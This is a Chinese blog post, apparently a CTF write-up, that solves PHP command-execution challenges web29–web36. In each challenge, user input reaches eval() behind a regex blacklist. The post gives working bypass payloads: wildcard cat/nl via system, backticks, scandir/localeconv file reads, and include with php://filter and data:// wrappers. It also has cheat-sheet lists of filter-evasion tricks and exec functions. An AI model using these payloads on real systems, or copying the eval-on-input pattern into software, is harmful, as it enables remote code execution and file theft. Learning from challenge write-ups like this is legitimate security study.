---
title: "web入门3"
description: "web入门3 命令执行 web29 error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } preg_match()是字符串匹配函数，函…"
publishedAt: "2022-08-01T15:40:18+08:00"
route: "/2022/08/01/web入门3/"
categories: ["未分类"]
tags: []
legacyId: 285
draft: false
---

<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
<title>web入门3</title>
</head>
<body><h2 id='命令执行'>命令执行</h2>
<h3 id='web29'>web29</h3>
<pre><code class='language-php' lang='php'>error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!preg_match(&quot;/flag/i&quot;, $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
</code></pre>
<p><code>preg_match()</code>是字符串匹配函数，函数用于执行一个正则表达式匹配，模式分隔符后的&quot;i&quot;标记这是一个大小写不敏感的搜索。也就是说我们传入的东西只要不含flag及其大写变形，就可以绕过这个匹配。</p>
<p>可以使用通配符进行匹配</p>
<ul>
<li>*可以匹配0或多个字符</li>
<li>?可以匹配任意一个字符</li>
<li>[abcd]  匹配abcd中任何一个字符</li>
<li>[a-z]   表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符</li>

</ul>
<p>所以这里的flag可以用<code>f*</code>或<code>f???</code>替代，我们让c调用system的cat或nl直接获得flag，或者cp去复制文件，这里执行命令中间的空格需要url编码</p>
<pre><code class='language-php' lang='php'>?c=system(&quot;cat%20f*.php&quot;);
?c=system(&quot;nl%20f*.php&quot;);
?c=system(&#39;cp%20fla?.php%201.txt&#39;);
</code></pre>
<p>以下总结一些常见的过滤绕过</p>
<ul>
<li><p>反引号``</p>
<blockquote><p>反引号``即命令替换
是指Shell可以先执行``中的命令，将输出结果暂时保存，在适当的地方输出</p>
</blockquote>
</li>
<li><p>单引号、双引号</p>
<blockquote><p>适用条件:过滤了字符串
放在shell命令中，绕过正则匹配且不影响原意</p>
</blockquote>
</li>
<li><p>空格绕过</p>
<blockquote><p>&lt; &lt;&gt; 重定向符
%09(需要php环境)
${IFS}
$IFS$9
{cat,flag.php} //用逗号实现了空格功能
%20
%09</p>
</blockquote>
</li>
<li><p>cat绕过</p>
<blockquote><p>适用条件:过滤了cat
(1)more:一页一页的显示档案内容
(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
(3)head:查看头几行
(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
(5)tail:查看尾几行
(6)nl：显示的时候，顺便输出行号
(7)od:以二进制的方式读取档案内容
(8)vi:一种编辑器，这个也可以查看
(9)vim:一种编辑器，这个也可以查看
(10)sort:可以查看
(11)uniq:可以查看
(12)file -f:报错出具体内容
(13)grep grep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
</blockquote>
</li>
<li><p>liunx通配符绕过</p>
<blockquote><p>适用条件:过滤了flag，没有过滤 ? *
在linux系统中 有一些通配符</p>
<p>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *
? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0
[abcd] 匹配abcd中任何一个字符
[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</p>
</blockquote>
</li>
<li><p>include 和伪协议的配合</p>
<blockquote><p>因为include包含php文件不会在页面显示出来
所以可以配合伪协议将flag.php打印,而且新的参数不会受过滤影响</p>
</blockquote>
</li>

</ul>
<h3 id='web30'>web30</h3>
<pre><code class='language-php' lang='php'>error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!preg_match(&quot;/flag|system|php/i&quot;, $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>过滤了<code>flag,system,php</code>，所以考虑使用<code>echo</code>函数，反引号``有system()的作用，所以：</p>
<pre><code>?c=echo%20`nl%20f*`;
</code></pre>
<p>当然还有很多函数可以执行命令</p>
<blockquote><p>system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
反引号 同shell_exec() </p>
</blockquote>
<h3 id='web31'>web31</h3>
<pre><code class='language-php' lang='php'>&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}

</code></pre>
<p>过滤了<code>cat,flag,system,php,sort,shell</code>等等，官方wp看不懂，需要以下的知识：</p>
<blockquote><p>php函数操作：
scandir(’.’):扫描当前目录
localeconv() 函数返回一数组。而数组第一项就是<code>.</code>(用来绕过.过滤)
pos(),current():返回数组第一个值</p>
<p>数组操作函数：
end():数组指针指向最后一位
next(): 数组指针指向下一位
array_reverse(): 将数组颠倒
array_rand(): 随机返回数组的键名
array_flip()：交换数组的键和值</p>
<p>读取文件函数
file_get_content() :因为et被ban，所以不能使用
readfile()
highlight_file()
show_source()</p>
</blockquote>
<pre><code class='language-php' lang='php'>/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
/?c=echo%09`nl%09f*`;
</code></pre>
<h3 id='web32'>web32</h3>
<pre><code class='language-php' lang='php'>error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&quot;, $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>分号用?&gt;代替，但是过滤了括号就不能用带有括号的函数，所以使用不需要括号的<code>include</code>，</p>
<p>php伪协议通常用于文件包含中，php中文件包含的函数有很多，比如 <code>include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile</code></p>
<p>php支持的伪协议</p>
<blockquote><p>file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流</p>
</blockquote>
<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p>
<p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般<strong>对其进行编码，让其不执行</strong>。从而导致任意文件读取。</p>
<p>协议参数</p>
<figure><table>
<thead>
<tr><th>名称</th><th>描述</th></tr></thead>
<tbody><tr><td><code>resource=&lt;要过滤的数据流&gt;</code></td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td><code>read=&lt;读链的筛选列表&gt;</code></td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（<code>|</code>）分隔。</td></tr><tr><td><code>write=&lt;写链的筛选列表&gt;</code></td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（<code>|</code>）分隔。</td></tr><tr><td><code>&lt;；两个链的筛选列表&gt;</code></td><td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody>
</table></figure>
<p>利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p>
<p>而使用的convert.base64-encode，就是一种过滤器。</p>
<pre><code class='language-php' lang='php'>/?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<h3 id='web33'>web33</h3>
<pre><code class='language-php' lang='php'>error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\&quot;/i&quot;, $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>过滤了引号，不影响上题的payload。如果include被过滤了，可以用require来代替</p>
<h3 id='web34'>web34</h3>
<pre><code class='language-php' lang='php'>&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>过滤了冒号，但是伪协议的冒号在逃逸的参数1里，不能被过滤，同样的payload</p>
<h3 id='web35'>web35</h3>
<pre><code class='language-php' lang='php'>&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>又多过滤了左尖括号和双引号和等于，继续使用上一个payload。</p>
<p>还可以用data协议</p>
<pre><code class='language-php' lang='php'>/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;
</code></pre>
<h3 id='web36'>web36</h3>
<pre><code class='language-php' lang='php'>&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;])){
    $c = $_GET[&#39;c&#39;];
    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>过滤了数字，把逃逸参数的名字换成字母就可以了</p>
</body>
</html>
